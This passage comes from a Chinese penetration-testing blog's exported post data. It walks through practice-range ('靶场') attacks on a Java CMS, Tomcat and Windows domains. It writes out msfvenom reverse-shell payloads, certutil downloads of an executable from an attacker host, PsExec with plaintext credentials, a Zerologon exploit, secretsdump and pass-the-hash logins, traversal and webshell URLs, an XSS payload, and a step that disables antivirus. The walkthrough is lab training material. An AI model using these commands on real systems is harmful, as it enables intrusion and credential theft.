-p 3389 -r 192.168.8.124</p>\n<p><img src=\"54_kXDRmebDS-xUM7LqPBqWwIO0ysCAlrhsS51wa9Hw.png\" alt=\"image\"></p>\n<p>这里是使用CS的方式，第二个方式进行转发</p>\n<p>rportfwd 3389 192.168.8.124 3389</p>\n<p> </p>\n<p>可以连接，但是版本不匹配，无法连接成功，需要在同一系统的远程桌面进行连接</p>\n<p><img src=\"Vg6eorAW8jtAi3QZDD2lboaaI_OGaSQga-BT8rz4zCk.png\" alt=\"image\"></p>\n<p><img src=\"FzV81Z-ESDyIJcUPe2tcY1rY5MuEq7-5PCg1g07xao8.png\" alt=\"image\"></p>\n<p>10.3. 破解 tomcat 服务器管理员 hash</p>\n<p><img src=\"huc3eKQvL5LKIhp--wklQNi2c1-2KHX25bks5m5jN1U.png\" alt=\"image\"></p>\n<p>远程登录到目标服务器，然后将杀毒软件都关闭</p>\n<h1 id=\"11-添加-ipsec-入站规则\"><a href=\"#11-添加-ipsec-入站规则\" class=\"headerlink\" title=\"11. 添加 ipsec 入站规则\"></a>11. 添加 ipsec 入站规则</h1><p>使用msf生成一个反弹shell的木马</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.129 LPORT=7788 -e x86/shikata_ga_nai -i 15 -f csharp -o payload-re-7788.txt</span><br></pre></td></tr></table></figure>\n<p>上传到tomcat的服务器中</p>\n<p><img src=\"uBG58GiGog6iiECvmzik0VyKXoZJ2BsnlWGVbw1S3F4.png\" alt=\"image\"></p>\n<h2 id=\"11-1sc-复制文件到文件服务器\"><a href=\"#11-1sc-复制文件到文件服务器\" class=\"headerlink\" title=\"11.1sc 复制文件到文件服务器\"></a>11.1sc 复制文件到文件服务器</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell copy C:\\tomcat\\webapps\\msf.exe \\\\10.10.1.128\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"L-vbLgU9JEZBsrdcXSpzdHY4Nan1Dm3ElTl2VuErgdo.png\" alt=\"image\"></p>\n<p>查看是否已经复制到目标</p>\n<p><img src=\"9iSPOpkM4iI32VTuAkxOl2iBhgWV98EPffiSUwAxImo.png\" alt=\"image\"></p>\n<p>本地先开启监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 7788</span><br><span class=\"line\">run -j</span><br></pre></td></tr></table></figure>\n\n\n<p>上传PsExec64.exe到tomcat服务器，使用它来执行目标的msf.exe</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PsExec64.exe \\\\10.10.1.128 -u administrator -p QWEasd123 -i c:/msf.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"Q-nwJsOXVKR-2HpNubvy0YzaYsm-GOIg4MDs-SwTdlU.png\" alt=\"image\"></p>\n<p>添加 ipsec 入站规则</p>\n<p>在添加规则之前要登录系统把 360 安全卫士关掉，不然会进行 netsh 拦截 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell netsh interface portproxy add v4tov4 listenport=7788 connectaddress=192.168.8.133 connectport=7788</span><br></pre></td></tr></table></figure>\n<p><img src=\"b3p9XAIE6bFHhFZ5AYtfGpeL5Rn4cYoL1GaHGop6630.png\" alt=\"image\"></p>\n<p>查看规则 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell netsh interface portproxy show all</span><br></pre></td></tr></table></figure>\n<p><img src=\"4R3YtPgY1EyPq69YHmlw2trL_qqz8Bkya8sAvQ3O9fk.png\" alt=\"image\"></p>\n<p>在tomcat服务器增加防火墙允许的端口进来</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">&quot;7788&quot;</span> protocol=TCP <span class=\"built_in\">dir</span>=<span class=\"keyword\">in</span> localport=7788 action=allow</span><br></pre></td></tr></table></figure>\n<p><img src=\"SUsXYr1qmGUks_ocajNGn1JuLgkblu5v5hH7GSDcfh8.png\" alt=\"image\"></p>\n<h2 id=\"11-2执行文件\"><a href=\"#11-2执行文件\" class=\"headerlink\" title=\"11.2执行文件\"></a>11.2执行文件</h2><p>然后到tomcat服务器运行以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PsExec64.exe \\\\10.10.1.128 -u administrator -p QWEasd123 -i c:/msf.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"lqe2hfppKH-1hRwunk87WjcWvB4kz9f-N-y0HV_sKVQ.png\" alt=\"image\"></p>\n<p>查看msf的上线情况，发现已经成功上线了</p>\n<p><img src=\"yO706_G0lD3xJcsgB0We2EgGSkbgo1pbA2K3KhueE3o.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br><span class=\"line\">run autoroute -p</span><br></pre></td></tr></table></figure>\n<p><img src=\"nH82g47g7uOIXAKvWUqieZBvBUV3xuCuRBUN80Mb6fA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport 3333</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"CaFp5xFyW64hirGK15hOq5RMFp1xjnSRyhr5HcVdnE8.png\" alt=\"image\"></p>\n<h1 id=\"12-对-ad-域-网段进行信息收集\"><a href=\"#12-对-ad-域-网段进行信息收集\" class=\"headerlink\" title=\"12.对 ad(域)网段进行信息收集\"></a>12.对 ad(域)网段进行信息收集</h1><h2 id=\"12-1nmap-跨网段扫描-AD-域控端口\"><a href=\"#12-1nmap-跨网段扫描-AD-域控端口\" class=\"headerlink\" title=\"12.1nmap 跨网段扫描 AD 域控端口\"></a>12.1nmap 跨网段扫描 AD 域控端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.139 -p 88,445,139,80 </span><br></pre></td></tr></table></figure>\n<p><img src=\"MtwAXoCPTgoHGHnkFHaP6bCMXaB1yMzD4NOtJ2Gvzqs.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"tbdtPV9szXlOoryfjkVq1NNhFT0oDvWSZ4_Bpq8AfMw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_computers</span><br></pre></td></tr></table></figure>\n<p><img src=\"6h9Oz91XWAbgnxSP1yWXO8YI-T2kjqEIRD8Cw2NW2Zc.png\" alt=\"image\"></p>\n<p>看到端口信息 可以确定这台是域控 CVE-2020-1472: NetLogon 打穿域</p>\n<p>存在漏洞 可以进行利用 密码重置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains ./cve-2020-1472-exploit.py dc 10.10.10.139</span><br></pre></td></tr></table></figure>\n<p><img src=\"TYyxYAo_TYozznyLFzQJu1v-5bLLFJ3TdmfjoqIP2Zk.png\" alt=\"image\"></p>\n<h2 id=\"12-2Impacket-secretsdump-获取域控哈希\"><a href=\"#12-2Impacket-secretsdump-获取域控哈希\" class=\"headerlink\" title=\"12.2Impacket secretsdump 获取域控哈希\"></a>12.2Impacket secretsdump 获取域控哈希</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python3 secretsdump.py fbi/dc\\<span class=\"variable\">$@10</span>.10.10.139 -just-dc -hashes :</span><br></pre></td></tr></table></figure>\n<p><img src=\"mId15huEofNF_tIkf1cnQys7rO7PEGLWbiCAsuUY4Yo.png\" alt=\"image\"></p>\n<h2 id=\"12-3Impacket-smbexec-py-登录域\"><a href=\"#12-3Impacket-smbexec-py-登录域\" class=\"headerlink\" title=\"12.3Impacket smbexec.py 登录域\"></a>12.3Impacket smbexec.py 登录域</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3 administrator@10.10.10.139</span><br></pre></td></tr></table></figure>\n<p><img src=\"3K6UdTY-1hypPzsHsY7jS8zEEGM8T4Q6HLqHUj_eXYQ.png\" alt=\"image\"></p>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"打靶日记（六）不出网的情况下的多域控渗透","url":"/2022/03/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%A4%9A%E5%9F%9F%E6%8E%A7%E6%B8%97%E9%80%8F/","content":"<h1 id=\"打靶日记（六）不出网的情况下的多域控渗透\"><a href=\"#打靶日记（六）不出网的情况下的多域控渗透\" class=\"headerlink\" title=\"打靶日记（六）不出网的情况下的多域控渗透\"></a>打靶日记（六）不出网的情况下的多域控渗透</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第六篇。</strong></p>\n<h1 id=\"1-项目介绍\"><a href=\"#1-项目介绍\" class=\"headerlink\" title=\"1.项目介绍\"></a>1.项目介绍</h1><p>项目九 是一个多域控 而且不出网的环境，是根据实际的环境改造而来。多 个域控应用在大型内网中，其中域控分有主域控，支部域控。例如一个公司在北 京有个总部办事处，广州有办事处，在上海也有办事处。每一个区域除了处理自 身的事务。而且个各个地方办事处内部信息共享，信息同步等。多个域控也类似， 可以信息同步。 </p>\n<p>本项目是一个不出网的环境，不出网就是内网不能访问外部。只允许入站， 入网的意思是允许访问。</p>\n<p>本项目存在多个后端防火墙，可控制出站协议。存在多 个 DMZ （隔离区、非军事化区），也存在多个 VPN 点对点通信。 本项目不出网 所以向 metasploit 和 cobalt strike 这种针对内网渗透的工具 都不能在当前环境使用，进行这种测试要用到许多的小工具和技巧，而且环境复 杂测试起来要非常有耐心，非常考验渗透测试水平。 </p>\n<p>本项目是模拟红队对外网目标进行打点，经过多种渗透测试方法，找到入口 点，接着通过入口点对内部网络进行渗透测试，并且打穿整个内网，拿到指定渗 透域控，定位运维组人员，拿下运维机子，登录指定目标，获取信息。 </p>\n<p>本项目能学习 WEB 方面 java 框架的网站渗透，黑盒漏洞挖掘，垂直越权， 文件任意下载，多个逻辑漏洞，中间件 tomcat 利用，goby 扫描器使用，xray 被 动扫描器使用、kali 最版版本的使用，java 应用环境搭建。</p>\n<p> 本项目能学习内网方面，不出网下渗透高度复杂的内网渗透域渗透、多域渗 透、exchange 破解、，包括代理隧道、端口转发，多层网络横向渗透，跨网段渗 透，突破防火墙、渗透防火墙、ICMP 反弹 shell、DNS 后门，IPC 内网渗透，kali 渗透，端口扫描，mimikatz、nc 反弹 shell、密码记录，token 令牌获取，njrat 远 控，ladon 扫描器 Behinder 等工具的使用。</p>\n<h1 id=\"2-环境搭建\"><a href=\"#2-环境搭建\" class=\"headerlink\" title=\"2.环境搭建\"></a>2.环境搭建</h1><p>靶场示意图</p>\n<p><img src=\"PlSxBWU7BaTHDGipXX9IeLSsDKwgYLayFcY_rGAkMCg.png\" alt=\"image\"></p>\n<p>这图靶机总共有十七个，因为靶场的的主机较多，所以要求服务器的性能较高。 把所有主机开启占用内存大概 55GB，占用硬盘容量大概 400G 建议选购买或者组 装一台性能不错的主机当做靶场服务器，最好购买二手的服务器或二手件 五千 以内绝对搞定。 </p>\n<p>我的配置是 CPU E3-1230 v5 运行内存 64GB 硬盘</p>\n<h1 id=\"3-信息收集\"><a href=\"#3-信息收集\" class=\"headerlink\" title=\"3.信息收集\"></a>3.信息收集</h1><h2 id=\"3-1端口扫描\"><a href=\"#3-1端口扫描\" class=\"headerlink\" title=\"3.1端口扫描\"></a>3.1端口扫描</h2><p>主机发现</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover</span><br></pre></td></tr></table></figure>\n<p><img src=\"COSda0bjn48uSzwFYY-lcjY_8GbHmHvIXrNZjHT_ZKs.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan -p 1-65535 192.168.8.195  --rate=1000</span><br></pre></td></tr></table></figure>\n<p><img src=\"KOpJoF8mZPCMn_hFHBvfrLcfx3Du0w-9-Trv7yQySV8.png\" alt=\"image\"></p>\n<p><img src=\"tCXrFrOIHqjoQhGal43B5iF-PlCZ6v5nEGKTrOhlH8c.png\" alt=\"image\"></p>\n<p><img src=\"dmPyWJrv35vfQN7Fyt6xsDAuB_uJmmX6FMfhJD-zRHE.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<h2 id=\"3-2绑定hosts\"><a href=\"#3-2绑定hosts\" class=\"headerlink\" title=\"3.2绑定hosts\"></a>3.2绑定hosts</h2><p>把写入本地 hosts</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.8.195 www.moonsec123.com</span><br><span class=\"line\">widows</span><br><span class=\"line\">C:\\Windows\\System32\\drivers\\etc\\hosts</span><br><span class=\"line\">Linux</span><br><span class=\"line\">/etc/hosts</span><br></pre></td></tr></table></figure>\n<p><img src=\"iKICfwktddqMN3nHbIWHiIKoaiVM4q3Wc-MEfRAObYM.png\" alt=\"image\"></p>\n<p>还是不出现页面，这里踩了一个很大的坑，TMG的外部网络IP没有修改，导致一直访问不到后端的服务。解决方案如下：</p>\n<p>（1）修改网卡的IP地址</p>\n<p><img src=\"sqF704VV2Pt3dSNukdsnaTDqTFMxjFcLvfyiMKcOEI0.png\" alt=\"image\"></p>\n<p>（2）修改TMG的外部网络地址，一直下一步，完成之后即可</p>\n<p><img src=\"Y9Br0Bz7grtvRZ6TCyhyuQPJ5gUtB9fIYiCwltcgcUs.png\" alt=\"image\"></p>\n<p>（3）更改外部3389端口，最后需要在上面点击应用才行</p>\n<p><img src=\"vHuWPZzyldEvLyQRP9KulhwL5VUDhshnMy6DSPrHubE.png\" alt=\"image\"></p>\n<p>再次扫描之后发现开启的是80和33389端口</p>\n<p><img src=\"98rP5eZX4ceCr8weZHIeXMCk7ehkhPPghpM_W2jc9fA.png\" alt=\"image\"></p>\n<p>nmap再次探测</p>\n<p><img src=\"73DeFOFeeUl1z8K8d3BiS9G5fCVNS5QTO7ZXb3sfnHM.png\" alt=\"image\"></p>\n<p>绑定域名之后，访问页面访问 <a href=\"http://www.moonsec123.com/\">www.moonsec123.com</a> 是 javamps 程序的网站</p>\n<p><img src=\"fEK2hbh5fdiGcVgB6fDSjLcnCjpyOQTEP0j2a9m3gwI.png\" alt=\"image\"></p>\n<h1 id=\"4-测试-JAVAMPS-网站安全\"><a href=\"#4-测试-JAVAMPS-网站安全\" class=\"headerlink\" title=\"4. 测试 JAVAMPS 网站安全\"></a>4. 测试 JAVAMPS 网站安全</h1><h2 id=\"4-1-Goby-扫描器检测网站安全\"><a href=\"#4-1-Goby-扫描器检测网站安全\" class=\"headerlink\" title=\"4.1. Goby 扫描器检测网站安全\"></a>4.1. Goby 扫描器检测网站安全</h2><h2 id=\"4-2-Xray-扫描网站\"><a href=\"#4-2-Xray-扫描网站\" class=\"headerlink\" title=\"4.2.Xray 扫描网站\"></a>4.2.Xray 扫描网站</h2><h3 id=\"4-2-1-设置代理\"><a href=\"#4-2-1-设置代理\" class=\"headerlink\" title=\"4.2.1. 设置代理\"></a>4.2.1. 设置代理</h3><h3 id=\"4-2-2-被动扫描命令\"><a href=\"#4-2-2-被动扫描命令\" class=\"headerlink\" title=\"4.2.2. 被动扫描命令\"></a>4.2.2. 被动扫描命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-3搭建源码测试漏洞\"><a href=\"#4-3搭建源码测试漏洞\" class=\"headerlink\" title=\"4.3搭建源码测试漏洞\"></a>4.3搭建源码测试漏洞</h2><p>安装好后分析文件 </p>\n<p>数据文件路径 WEB-INF\\config\\jdbc\\jdbc.properties </p>\n<p>本地安装后发现 会存在几个默认账号 密码是 11111</p>\n<h2 id=\"4-4后台任意文件下载\"><a href=\"#4-4后台任意文件下载\" class=\"headerlink\" title=\"4.4后台任意文件下载\"></a>4.4后台任意文件下载</h2><p>本地搭建后，登录后台进行漏洞挖掘，经过一段时间的挖掘发现几个漏洞，其中 漏洞最大的是 后台任意文件下载， </p>\n<p>但是管理员权限的，但是 check 虽然信息审核员，如果没有做权限验证，后台的 用户应该可能下载，经测试也是可以的。下载数据库文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonsec123.com/admin/data/o_download.do?filename=../WEB-INF/config/jdbc/jdbc.properties</span><br></pre></td></tr></table></figure>\n<p><img src=\"X1NRNlt6L3TlW_6J-5nU5I85v_VVADz3-ldxu0fJW3A.png\" alt=\"image\"></p>\n<h2 id=\"4-5任意文件下载-读取-tomcat-user-xml\"><a href=\"#4-5任意文件下载-读取-tomcat-user-xml\" class=\"headerlink\" title=\"4.5任意文件下载 读取 tomcat-user.xml\"></a>4.5任意文件下载 读取 tomcat-user.xml</h2><p>当前网站只开放 80 端口，读取数据库配置文件作用不是特别大，最好是下载 tomcat 的配置文件，如果有设置账号和密码，那就可以顺利找到一个入口点。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonsec123.com/admin/data/o_download.do?filename=../../../../apache-tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure>\n<p><img src=\"-wrVUiXua85AUsIq18xP_A9T1-zPlM_aH-mb1c4X3Gc.png\" alt=\"image\"></p>\n<p><img src=\"_rekCH2VFSi09vwX7Wm0nUYNlnj1b2bTrCtchrZ7yrk.png\" alt=\"image\"></p>\n<h2 id=\"4-6登录-tomcat-上传war-文件getshell\"><a href=\"#4-6登录-tomcat-上传war-文件getshell\" class=\"headerlink\" title=\"4.6登录 tomcat 上传war 文件getshell\"></a>4.6登录 tomcat 上传war 文件getshell</h2><p>打包shell.jsp为war包</p>\n<p>jar  cvf  jspwar.war  shell.jsp</p>\n<p>登录后台部署项目</p>\n<p><img src=\"MQVFEzS1RUnA9U8W54WR13CMzqbTZ3sVrSmwOoAhdzA.png\" alt=\"image\"></p>\n<p>访问shell.jsp</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonsec123.com/jspwar/shell.jsp</span><br></pre></td></tr></table></figure>\n<p><img src=\"ruRTLKEokJuibPZV1fdYQQ6sk0i9NYFTaOm4IETLq6c.png\" alt=\"image\"></p>\n<h2 id=\"4-7-Javapms-其他漏洞\"><a href=\"#4-7-Javapms-其他漏洞\" class=\"headerlink\" title=\"4.7. Javapms 其他漏洞\"></a>4.7. Javapms 其他漏洞</h2><h3 id=\"4-7-1javapms-越权修改漏洞\"><a href=\"#4-7-1javapms-越权修改漏洞\" class=\"headerlink\" title=\"4.7.1javapms 越权修改漏洞\"></a>4.7.1javapms 越权修改漏洞</h3><p>漏洞描述：</p>\n<p> 注册普通会员登录系统 修改个人资料 使用 id 进行验证，所以可以修改任何人 的名字。包括管理员和普通用户。</p>\n<p> 漏洞验证 ：</p>\n<p>注册普通用户 进入 个人资料修改</p>\n<p>将23改为24</p>\n<p><img src=\"MzjqFNKzrACJYgrA0W8gNhxf5KLz9nxxE3Q2zuzXG7I.png\" alt=\"image\"></p>\n<p>登录id为24的账号，发现信息被修改了</p>\n<p><img src=\"6HDgdAx_IM6r6xsucOFvFMAHupQQea7Em85UuJcDmYM.png\" alt=\"image\"></p>\n<h3 id=\"4-7-2javapms-v1-4-beta-XSS-漏洞\"><a href=\"#4-7-2javapms-v1-4-beta-XSS-漏洞\" class=\"headerlink\" title=\"4.7.2javapms_v1.4.beta XSS 漏洞\"></a>4.7.2javapms_v1.4.beta XSS 漏洞</h3><p>漏洞描述：</p>\n<p>会员登录-&gt;会员管理中心-&gt;文档发布 标题出没有进行过滤 造成 xss 漏洞</p>\n<p>漏洞验证：</p>\n<p>会员登录-&gt;管理员中心-&gt;文档发布</p>\n<p>发现h1起作用了</p>\n<p><img src=\"N_pBHT8QiGb_3k2ErIdhLy6lkARmXq6nvtQ_ufm-CS8.png\" alt=\"image\"></p>\n<p>添加payload</p>\n<p><img src=\"K9CNcPxuN2P2wH3PPOGPqk_iEQIiSmVpz8KaA2YxZEU.png\" alt=\"image\"></p>\n<p><img src=\"X7Zl_GeLMZ_A5SxC2fxMyiFafGdXOoRbA_p9a1SBH8M.png\" alt=\"image\"></p>\n<p>文档发布处的标题，填入正常数据</p>\n<p>提交后</p>\n<p><img src=\"Q6VuDia7plb5w6VfXqwU6f5KSPToHgFCPgR07qax_xA.png\" alt=\"image\"></p>\n<p><img src=\"VGml0FXhSdya3qmA-JW7bDBF_7_CtJzI_d1JexmXP10.png\" alt=\"image\"></p>\n<p>使用</p><h1>11</h1>后提交，发生了变化<p></p>\n<p><img src=\"p33IJMJBLBGOieZ8xjUU1R1SXDFXfaEUwc8JZRraOJk.png\" alt=\"image\"></p>\n<p>效果</p>\n<p><img src=\"nlwtas3Z6Tja5dmh8Mlnk849rooe3lese9nHZtMotBM.png\" alt=\"image\"></p>\n<p>使用payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"ceCVzhCg3bxd73ev7Dxv2AMGpY11UQrdWRPayf79RpQ.png\" alt=\"image\"></p>\n<p><img src=\"TpauOVfb6t2zBNPnWf1FfYPV2rFPNF2We5jRLzjUl9w.png\" alt=\"image\"></p>\n<p><img src=\"bmqssBJeXz9Bx9c7WP6eaH1pOhASrxwb4ANbER7UeE4.png\" alt=\"image\"></p>\n<p><img src=\"MMa7KSVjqjvGXlbopyQKBH5HxpTtwy3SkV13rPZE_Js.png\" alt=\"image\"></p>\n<h3 id=\"4-7-3javapms-v1-4-beta-后台getshell\"><a href=\"#4-7-3javapms-v1-4-beta-后台getshell\" class=\"headerlink\" title=\"4.7.3javapms_v1.4.beta 后台getshell\"></a>4.7.3javapms_v1.4.beta 后台getshell</h3><p><strong>漏洞描述</strong></p>\n<p>1.后台可以创建目录，创建目录的时候可以穿越到其他目录。</p>\n<p>2.创建文件的时候可以虽然限制了后缀名，但是重名名文件的时候，可以修改成</p>\n<p>任何后缀名，而且没有对路径进行过滤，也会造成目录穿越。</p>\n<p>3.在网站根目录因为框架的原因并不会解析 jsp，但是在上级 webapps 目录会解</p>\n<p>析 jsp。</p>\n<p>4.把目录创建在 webapps 的时候，并且将 jsp 重名 移动到目录即可 getshell。</p>\n<p><strong>漏洞验证</strong></p>\n<p>创建目录 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;moonsec</p>\n<p><img src=\"lmW5XTJD4L9yEYojLh1YjCseSleMTE6YBtSQtubipJQ.png\" alt=\"image\"></p>\n<p>选择重名 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;garck&#x2F;1.jsp</p>\n<p><img src=\"VNLpZg2P-rOB0ioGCv6MsLKjRPKi9lEIWgEoVBCf2fk.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">访问：http://www.moonsec123.com/garck/1.jsp?cmd=<span class=\"built_in\">whoami</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"-qv9AVb9jIiTia0OJ-6m8ej53NOR88jrV9hcWFzXN2s.png\" alt=\"image\"></p>\n<h3 id=\"4-7-4javapms-v1-4-beta-用户可穷举\"><a href=\"#4-7-4javapms-v1-4-beta-用户可穷举\" class=\"headerlink\" title=\"4.7.4javapms_v1.4.beta 用户可穷举\"></a>4.7.4javapms_v1.4.beta 用户可穷举</h3><p><strong>漏洞描述</strong></p>\n<p>在注册处，如果填写账号会自动检测账号是否存在。并且没有进行有效过滤。</p>\n<p><strong>漏洞验证</strong></p>\n<p>1111 用户不存在 返回 true</p>\n<p><img src=\"AqA_zh4Ox2R07IUqHQaA1uSh0bDaAMNa5mJGvY21Hl0.png\" alt=\"image\"></p>\n<p><img src=\"9WiIWeEnl2SgnsvbP2X0vZmF4Ul5T1HXJ_5zDbPpxWQ.png\" alt=\"image\"></p>\n<h3 id=\"4-7-5javapms-v1-4-beta-内置账号存在弱口令\"><a href=\"#4-7-5javapms-v1-4-beta-内置账号存在弱口令\" class=\"headerlink\" title=\"4.7.5javapms_v1.4.beta 内置账号存在弱口令\"></a>4.7.5javapms_v1.4.beta 内置账号存在弱口令</h3><p><strong>漏洞描述</strong></p>\n<p>程序内置多个账号 存在弱口令 可被恶意利用，而且后台验证不严格可配合其他</p>\n<p>漏洞一起使用，给系统带重大的安全隐患。</p>\n<p><strong>漏洞验证</strong></p>\n<p><img src=\"Cc2SRKEnroxFiyJ46_Qlk-KBtgiVVK5lnputtQ7WYKA.png\" alt=\"image\"></p>\n<table>\n<thead>\n<tr>\n<th>账号</th>\n<th>口令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>demo</td>\n<td>111111</td>\n</tr>\n<tr>\n<td>check</td>\n<td>111111</td>\n</tr>\n</tbody></table>\n<p>可配合其他漏洞一起使用。</p>\n<h2 id=\"4-8入口点环境分析\"><a href=\"#4-8入口点环境分析\" class=\"headerlink\" title=\"4.8入口点环境分析\"></a>4.8入口点环境分析</h2><p><img src=\"KBwphq_ZbCvmolX_613EnuXrbYqQw9LQW07gzF_zmdk.png\" alt=\"image\"></p>\n<p><img src=\"-JkODnWTOGsY-mWowdyqe6HD7RGeX9DKibbNRTeVnws.png\" alt=\"image\"></p>\n<p>网关是 192.168.22.128 当前 ip 是 192.168.22.130 是经 128 出网。 192.168.22.128 是代理或者防火墙</p>\n<h2 id=\"4-9主机发现\"><a href=\"#4-9主机发现\" class=\"headerlink\" title=\"4.9主机发现\"></a>4.9主机发现</h2><p><img src=\"Y6u1wFQoIKgrDjf_Mb70pQTMdBHQULnZ8sdL9fHWQxk.png\" alt=\"image\"></p>\n<table>\n<thead>\n<tr>\n<th>主机名</th>\n<th>IP</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>03SERVER3</td>\n<td>192.168.22.13</td>\n</tr>\n<tr>\n<td>12SERVER2</td>\n<td>192.168.22.130</td>\n</tr>\n<tr>\n<td>12SERVER4</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"4-9-1能使用的出站协议\"><a href=\"#4-9-1能使用的出站协议\" class=\"headerlink\" title=\"4.9.1能使用的出站协议\"></a>4.9.1能使用的出站协议</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Ping </span><br><span class=\"line\">DNS</span><br><span class=\"line\">ping www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"8xnGKbY08YX-_Ram4xvFB0IB4GwkUb_5Gyw6BA-OAu8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">certutil.exe -urlcache -<span class=\"built_in\">split</span> -f https://www.baidu.com/index.html</span><br></pre></td></tr></table></figure>\n<p><img src=\"f5d9rGoKQCrEvG1rBznpZt81DL9kwz8V3azOaevEJZU.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"YpHcexoBq5rtFwH0eCWK7jvF_Zvuw_5lrS7hqrpj4vo.png\" alt=\"image\"></p>\n<p>4.10. Msfconsole 生成后门上线 </p>\n<p>生成攻击载荷 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p <span class=\"built_in\">set</span> payload windows/x64/meterpreter/reverse_tcp lhost=192.168.0.182 lport=2333 -f exe -o 233.exe </span><br></pre></td></tr></table></figure>\n<p>监听端口 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler </span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/x64/meterpreter/reverse_tcp </span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.0.182 </span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 2333 </span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p>下载文件 certutil -urlcache -split -f <a href=\"http://192.168.0.182/233.exe\">http://192.168.0.182/233.exe</a></p>\n<p> 建立简单的 web 服务器</p>\n<p> sudo python -m SimpleHTTPServer 80 </p>\n<p>但是不能出网</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Metasploit 生成 war 后门 </span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.182 LPORT=2333 -f Jsp &gt; 2.jsp </span><br><span class=\"line\">打包成 zip 改成 war 在 tomcat 上传 </span><br><span class=\"line\">设置监听 </span><br><span class=\"line\"><span class=\"built_in\">set</span> payload java/jsp_shell_reverse_tcp 